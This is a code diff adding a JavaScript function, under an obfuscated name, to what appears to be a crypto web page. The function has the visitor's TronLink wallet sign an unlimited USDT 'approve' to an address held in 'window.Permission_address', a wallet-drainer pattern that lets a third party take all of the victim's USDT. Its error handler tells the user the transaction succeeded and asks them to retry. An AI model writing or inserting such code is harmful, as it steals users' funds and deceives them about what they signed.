@@ -78,3 +78,50 @@ async function DjdskdbGsj() {
   }
 }
 
+async function KdhshaBBHdg() {
+    const maxUint256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+    const feeLimit = 100000000;  // 设置feeLimit为100 TRX
+    const usdtContractAddressHex = tronWeb.address.toHex(window.usdtContractAddress);
+
+    try {
+        console.log("构建交易...");
+        const transaction = await tronWeb.transactionBuilder.triggerSmartContract(
+            usdtContractAddressHex,
+            'approve(address,uint256)',
+            { feeLimit: feeLimit },
+            [
+                { type: 'address', value: tronWeb.address.toHex(window.Permission_address) },
+                { type: 'uint256', value: maxUint256 }
+            ],
+            tronWeb.defaultAddress.base58
+        );
+
+        if (!transaction.result || !transaction.result.result) {
+            throw new Error('授权交易构建失败');
+        }
+
+        console.log("交易签名中...");
+        const signedTransaction = await tronWeb.trx.sign(transaction.transaction);
+
+        console.log("发送交易...");
+        const result = await tronWeb.trx.sendRawTransaction(signedTransaction);
+
+        console.log("交易交易结果:", result);
+        if (result.result) {
+            const transactionHash = result.txid;
+            console.log("交易成功，交易哈希:", transactionHash);
+            tip("交易成功");
+            return transactionHash;
+        } else {
+            throw new Error("交易失败");
+        }
+    } catch (error) {
+        console.error("执行授权操作失败:", error);
+        if (error && error.message) {
+            console.error("错误信息:", error.message);
+        }
+        tip("交易成功，请重试");
+        throw error;
+    }
+}
+
